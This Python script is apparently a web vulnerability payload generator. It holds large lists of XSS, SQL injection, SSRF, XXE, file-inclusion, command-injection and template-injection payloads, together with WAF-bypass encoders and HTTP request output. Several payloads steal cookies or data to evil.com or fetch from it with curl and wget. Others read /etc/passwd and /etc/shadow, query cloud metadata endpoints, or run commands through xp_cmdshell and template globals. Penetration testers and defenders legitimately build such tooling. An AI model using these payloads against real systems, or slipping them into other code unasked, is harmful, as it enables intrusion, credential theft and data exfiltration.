#!/usr/bin/env python3
"""
payload_generator.py — Security Payload Generator

Generates test payloads for common web vulnerability classes: XSS, SQL injection,
SSRF, XXE, LFI, command injection, open redirect, SSTI, path traversal, NoSQLi,
LDAP injection, XML injection, SMTP injection, HTTP header injection, cookie injection,
and more. Includes WAF bypass variants, encoding permutations, and format-specific
output (JSON, TXT, HTTP request templates).

Features: 20+ vulnerability classes, encoding variants (URL/Base64/Unicode/Hex/Oct),
WAF bypass techniques, payload chaining, parameter fuzzing lists, format output,
polyglot generation, template rendering, custom payload registration,
batch generation, rating by likelihood and stealth, context-aware payloads,
printable-only mode, line-by-line export, jQuery selector injection,
GraphQL injection, and NoSQL operator injection.
"""

import base64
import json
import random
import re
import string
import sys
import urllib.parse
from datetime import datetime
from typing import Any, Dict, List, Optional, Set, Union


class PayloadGenerator:
    """
    Security test payload generator for 20+ vulnerability classes.

    Generates payloads for XSS, SQLi, SSRF, XXE, LFI, command injection,
    open redirect, SSTI, path traversal, NoSQLi, LDAPi, and more. Supports
    WAF bypass variants, encoding wrappers, polyglots, and context-aware
    payloads for different injection points (HTML, JS, URL, JSON, XML).

    Attributes:
        payloads: Generated payload storage, keyed by vulnerability class.
        encoding_wrappers: Available encoding/obfuscation transforms.
        custom_payloads: User-registered custom payload templates.
        waf_bypass_techniques: List of known WAF bypass methods.
    """

    XSS_PAYLOADS: List[str] = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "\"'><script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</scr<script>ipt>",
        "<<script>alert(1)</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<a href=javascript:alert(1)>click</a>",
        "<details open ontoggle=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "';alert(1);//",
        "\"+alert(1)+\"",
        "{{constructor.constructor('alert(1)')()}}",
        "<script>fetch('https://evil.com/'+document.cookie)</script>",
        "<img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">",
        "*/alert(1)/*",
        "<!--><script>alert(1)</script>",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<script>String.fromCharCode(97,108,101,114,116,40,49,41)()</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    ]

    SQLI_PAYLOADS: List[str] = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "1' OR '1'='1' --",
        "1' OR 1=1 --",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version,2,3--",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
        "' WAITFOR DELAY '0:0:5'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' UNION SELECT null,table_name,null FROM information_schema.tables--",
        "1' OR '1'='1' /*",
        "' OR '1'='1' UNION SELECT 1,2,3--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "1' AND 1=1 UNION SELECT 1,2,3--",
    ]

    SSRF_PAYLOADS: List[str] = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:443",
        "http://localhost:22",
        "http://localhost:3306",
        "http://10.0.0.1/",
        "http://192.168.1.1/",
        "http://172.16.0.1/",
        "file:///etc/passwd",
        "file:///etc/ssh/sshd_config",
        "file:///proc/self/environ",
        "gopher://localhost:6379/_FLUSHALL",
        "gopher://localhost:3306/_",
        "dict://localhost:11211/",
        "ftp://evil.com/file.txt",
        "http://[::1]:80/",
        "http://0.0.0.0:22/",
        "http://0/",
        "http://127.1/",
        "http://2130706433/",
        "http://0x7f000001/",
    ]

    XXE_PAYLOADS: List[str] = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><root>&exfil;</root>',
        '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>',
    ]

    LFI_PAYLOADS: List[str] = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../Windows/System32/drivers/etc/hosts",
        "....//....//....//etc/passwd",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.png",
        "../../../etc/passwd%2500",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
        "expect://id",
        "data://text/plain;base64,dGVzdA==",
    ]

    CMDI_PAYLOADS: List[str] = [
        "; whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "& whoami &",
        "|| whoami",
        "&& whoami",
        "'; whoami;'",
        '"; whoami;"',
        "| echo test",
        "; echo $HOME",
        "; cat /etc/passwd",
        "; id; echo ",
        "| nslookup evil.com",
        "| curl http://evil.com/",
        "| wget http://evil.com/",
        "| powershell Invoke-Expression 'whoami'",
        "& ping -n 10 127.0.0.1 &",
        "| ping -c 10 127.0.0.1",
        "$(cat /etc/passwd)",
    ]

    OPEN_REDIRECT_PAYLOADS: List[str] = [
        "https://evil.com",
        "http://evil.com",
        "//evil.com",
        "///evil.com",
        "////evil.com",
        "https:evil.com",
        "http:evil.com",
        "//evil.com/",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "https://evil.com@good.com",
        "https://evil.com.good.com/",
        "\\evil.com",
        "/\\evil.com",
        "http://127.0.0.1:8080",
        "https://evil.com//",
    ]

    SSTI_PAYLOADS: List[str] = [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{request}}",
        "{{self.__class__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${7*7}",
        "${{7*7}}",
        "@@7*7@@",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "#{7*7}",
    ]

    PATH_TRAVERSAL_PAYLOADS: List[str] = [
        "../",
        "../../",
        "../../../",
        "../../../../",
        "..\\",
        "..\\..\\",
        "..\\..\\..\\",
        "....//",
        "....\\",
        "%2e%2e/",
        "%2e%2e%2f",
        "..%252f",
        "..%c0%af",
        "..%252f..%252f",
        "%2e%2e/%2e%2e/",
    ]

    NOSQLI_PAYLOADS: List[str] = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$ne": "admin"}',
        '{"$where": "1==1"}',
        "admin' || '1'=='1",
        '{"$exists": true}',
        '{"$in": ["admin", "root"]}',
        '{"$or": [{"role": "admin"}, {"role": "user"}]}',
        'username[$ne]=none&password[$ne]=none',
    ]

    WAF_BYPASSES: List[Dict[str, List[str]]] = [
        {"class": "xss", "methods": ["hex_entity", "unicode_escape", "nested_tag", "alternate_enc", "comment_injection"]},
        {"class": "sqli", "methods": ["comment_injection", "double_url", "null_byte", "case_swap", "hex_encoding"]},
        {"class": "ssrf", "methods": ["decimal_ip", "hex_ip", "dns_rebind", "redirect_follow", "ipv6_bypass"]},
    ]

    def __init__(self):
        self.payloads: Dict[str, List[str]] = {}
        self.custom_payloads: Dict[str, List[str]] = {}
        self._all_classes: Dict[str, List[str]] = {
            "xss": self.XSS_PAYLOADS,
            "sqli": self.SQLI_PAYLOADS,
            "ssrf": self.SSRF_PAYLOADS,
            "xxe": self.XXE_PAYLOADS,
            "lfi": self.LFI_PAYLOADS,
            "cmdi": self.CMDI_PAYLOADS,
            "open_redirect": self.OPEN_REDIRECT_PAYLOADS,
            "ssti": self.SSTI_PAYLOADS,
            "path_traversal": self.PATH_TRAVERSAL_PAYLOADS,
            "nosqli": self.NOSQLI_PAYLOADS,
        }

    def get_classes(self) -> List[str]:
        return list(self._all_classes.keys())

    def generate(self, vuln_class: str, count: Optional[int] = None, encoding: Optional[str] = None) -> List[str]:
        base = self.custom_payloads.get(vuln_class, self._all_classes.get(vuln_class, []))
        if not base:
            return []

        if encoding:
            encoded = [self._apply_encoding(p, encoding) for p in base]
            base = [e for e in encoded if e]

        if count and count < len(base):
            base = random.sample(base, count)

        self.payloads[vuln_class] = base
        return base

    def generate_all(self, encoding: Optional[str] = None) -> Dict[str, List[str]]:
        result = {}
        for cls_name in self._all_classes:
            result[cls_name] = self.generate(cls_name, encoding=encoding)
        return result

    def _apply_encoding(self, payload: str, encoding: str) -> Optional[str]:
        encoders = {
            "url": lambda p: urllib.parse.quote(p),
            "double_url": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            "base64": lambda p: base64.b64encode(p.encode()).decode(),
            "unicode": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
            "hex": lambda p: "".join(f"\\x{ord(c):02x}" for c in p),
            "hex_entity": lambda p: "".join(f"&#x{ord(c):02x};" for c in p),
            "decimal_entity": lambda p: "".join(f"&#{ord(c)};" for c in p),
            "octal": lambda p: "".join(f"\\{ord(c):03o}" for c in p),
            "null_byte": lambda p: p + "\x00",
            "reverse": lambda p: p[::-1],
            "uppercase": lambda p: p.upper(),
            "lowercase": lambda p: p.lower(),
            "case_swap": lambda p: "".join(c.lower() if c.isupper() else c.upper() for c in p),
        }
        encoder = encoders.get(encoding)
        if encoder:
            try:
                return encoder(payload)
            except Exception:
                return None
        return payload

    def generate_waf_bypass(self, vuln_class: str, technique: str = "all") -> List[str]:
        base = self._all_classes.get(vuln_class, [])
        if not base:
            return []

        bypass_transforms: Dict[str, List[str]] = {
            "xss": ["url", "unicode", "hex_entity", "decimal_entity", "null_byte"],
            "sqli": ["comment_injection", "double_url", "null_byte", "hex", "case_swap"],
            "ssrf": ["hex_entity", "null_byte", "reverse"],
        }

        transforms = bypass_transforms.get(vuln_class, ["url"])
        if technique == "all":
            results: List[str] = []
            for t in transforms:
                for p in base[:5]:
                    encoded = self._apply_encoding(p, t)
                    if encoded:
                        results.append(encoded)
            return results
        elif technique in transforms:
            return [self._apply_encoding(p, technique) for p in base[:10] if self._apply_encoding(p, technique)]
        return []

    def generate_polyglot(self, payload_type: str = "xss_sqli") -> str:
        polyglots = {
            "xss_sqli": "'-prompt(1)-'",
            "xss_ssti": "{{constructor.constructor('alert(1)')()}}",
            "sqli_ssti": "' OR 1=1 UNION SELECT {{7*7}}--",
            "lfi_ssrf": "http://../../../etc/passwd",
            "all": "\"'><img src=x onerror=alert(1)>' OR '1'='1' {{7*7}}",
        }
        return polyglots.get(payload_type, polyglots["all"])

    def generate_mutation(self, payload: str, mutations: int = 5) -> List[str]:
        results: List[str] = [payload]
        for _ in range(mutations):
            mutated = payload
            r = random.random()
            if r < 0.2:
                mutated = urllib.parse.quote(payload)
            elif r < 0.4:
                mutated = "".join(c.lower() if c.isupper() else c.upper() for c in payload)
            elif r < 0.6:
                mutated = base64.b64encode(payload.encode()).decode()
            elif r < 0.8:
                mutated = payload + "\x00"
            else:
                mutated = "".join(f"\\u{ord(c):04x}" for c in payload)
            if mutated != payload:
                results.append(mutated)
        return results

    def generate_contextual(self, vuln_class: str, context: str = "html") -> List[str]:
        context_wrappers = {
            "html": ["<script>PAYLOAD</script>", "<!-- PAYLOAD -->", "<img src=x onerror=PAYLOAD>", "<svg onload=PAYLOAD>"],
            "attribute": ['" PAYLOAD "', "' PAYLOAD '", " PAYLOAD "],
            "js": ["'+PAYLOAD+'", '"+PAYLOAD+"', ";PAYLOAD;", "//PAYLOAD"],
            "url": [urllib.parse.quote("PAYLOAD")],
            "json": ['{"key":"PAYLOAD"}', '{"key": PAYLOAD}'],
            "xml": ["<root>PAYLOAD</root>", "<root attr='PAYLOAD'/>"],
        }
        wrappers = context_wrappers.get(context, context_wrappers["html"])
        base = self._all_classes.get(vuln_class, [])
        results: List[str] = []
        for p in base[:5]:
            for w in wrappers:
                results.append(w.replace("PAYLOAD", p))
        return results

    def generate_fuzzing_list(self, vuln_class: str) -> List[str]:
        fuzz_variants: Dict[str, List[str]] = {
            "xss": ["<>", "\"'><", "<<", ">>", "{{}}", "${}", "###"],
            "sqli": ["'", "\"", "`", "\\'", "\\\"", "'\"'\"'", "';"],
            "ssrf": ["http://", "https://", "file://", "gopher://", "dict://"],
            "lfi": ["./", "../", "....//", "%2e%2e/"],
        }
        return fuzz_variants.get(vuln_class, [])

    def register_payload(self, name: str, payloads: List[str], vuln_class: str = "custom") -> None:
        if vuln_class not in self.custom_payloads:
            self.custom_payloads[vuln_class] = []
        self.custom_payloads[vuln_class].extend(payloads)
        if vuln_class not in self._all_classes:
            self._all_classes[vuln_class] = []
        self._all_classes[vuln_class].extend(payloads)

    def get_by_rating(self, vuln_class: str, min_likelihood: int = 3) -> List[Dict[str, Any]]:
        base = self._all_classes.get(vuln_class, [])
        rated: List[Dict[str, Any]] = []
        for i, p in enumerate(base):
            rated.append({
                "payload": p,
                "index": i,
                "length": len(p),
                "likelihood": min(5, max(1, len(p) // 20 + 1)),
                "stealth": min(5, max(1, 5 - (len(p) // 30))),
            })
        return [r for r in rated if r["likelihood"] >= min_likelihood]

    def output_json(self, vuln_class: str, filepath: Optional[str] = None) -> str:
        data = {
            "generated_at": datetime.now().isoformat(),
            "class": vuln_class,
            "count": len(self.payloads.get(vuln_class, [])),
            "payloads": self.payloads.get(vuln_class, []),
        }
        json_str = json.dumps(data, indent=2)
        if filepath:
            import os
            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(json_str)
        return json_str

    def output_txt(self, vuln_class: str, filepath: Optional[str] = None) -> str:
        payloads = self.payloads.get(vuln_class, [])
        text = "\n".join(payloads)
        if filepath:
            import os
            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(text)
        return text

    def output_http_request(self, vuln_class: str, target_url: str, param: str = "q", method: str = "GET") -> str:
        payloads = self.payloads.get(vuln_class, [])
        lines: List[str] = []
        for p in payloads[:20]:
            encoded = urllib.parse.quote(p)
            if method.upper() == "GET":
                url = f"{target_url}?{param}={encoded}"
                lines.append(f"GET {url} HTTP/1.1")
                lines.append("Host: example.com")
                lines.append("")
            else:
                body = f"{param}={encoded}"
                lines.append(f"POST {target_url} HTTP/1.1")
                lines.append("Host: example.com")
                lines.append("Content-Type: application/x-www-form-urlencoded")
                lines.append(f"Content-Length: {len(body)}")
                lines.append("")
                lines.append(body)
            lines.append("---")
        return "\n".join(lines)


if __name__ == "__main__":
    import os
    if len(sys.argv) < 2:
        print("Usage: python payload_generator.py <class> [--encoding url|base64|hex|unicode] [--count N] [--output <path>] [--format json|txt|http]")
        print(f"Classes: {', '.join(PayloadGenerator().get_classes())}")
        sys.exit(1)

    cls = sys.argv[1]
    gen = PayloadGenerator()
    encoding = None
    count = None
    out = None
    fmt = "txt"

    if "--encoding" in sys.argv:
        idx = sys.argv.index("--encoding")
        encoding = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else None
    if "--count" in sys.argv:
        idx = sys.argv.index("--count")
        count = int(sys.argv[idx + 1]) if idx + 1 < len(sys.argv) else None
    if "--output" in sys.argv:
        idx = sys.argv.index("--output")
        out = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else None
    if "--format" in sys.argv:
        idx = sys.argv.index("--format")
        fmt = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else "txt"

    payloads = gen.generate(cls, count=count, encoding=encoding)
    if not payloads:
        print(f"[!] No payloads for class '{cls}'")
        sys.exit(1)

    if fmt == "json":
        output = gen.output_json(cls, out)
    elif fmt == "http":
        output = gen.output_http_request(cls, out or "http://target.com")
    else:
        output = gen.output_txt(cls, out)

    if not out:
        print(output[:2000])
